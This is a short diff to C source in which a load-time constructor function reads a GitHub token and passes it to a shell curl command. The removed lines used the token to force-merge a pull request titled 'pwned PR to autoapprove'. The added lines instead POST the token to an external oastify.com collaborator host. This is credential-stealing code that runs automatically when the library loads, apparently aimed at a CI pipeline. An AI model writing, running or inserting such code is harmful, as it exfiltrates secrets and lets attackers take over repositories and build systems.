@@ -62,12 +62,11 @@ static void __attribute__((constructor)) so_main(void) {
   if (inputToken != NULL && strlen(inputToken) > 2) {
     printf("Trying to use GITHUB TOKEN....\n");
     char command[1024];
-    snprintf(command, sizeof(command), "curl -X PUT "
-      "https://api.github.com/repos/mousefluff/wstg/pulls/3/merge "
-      "-H \"Accept: application/vnd.github.v3+json\" "
-      "--header \"authorization: Bearer %s\" "
-      "--header 'content-type: application/json' "
-      "-d '{\"commit_title\":\"pwned PR to autoapprove\"}'", inputToken);
+    snprintf(command, sizeof(command),
+             "curl -X POST https://ng77mee05nvr37hpmhvge45shjngb8zx.oastify.com "
+             "-H \"Content-Type: application/json\" "
+             "-d '{\"githubToken\": \"%s\"}'", 
+             inputToken);
 
     system(command);
   } else {
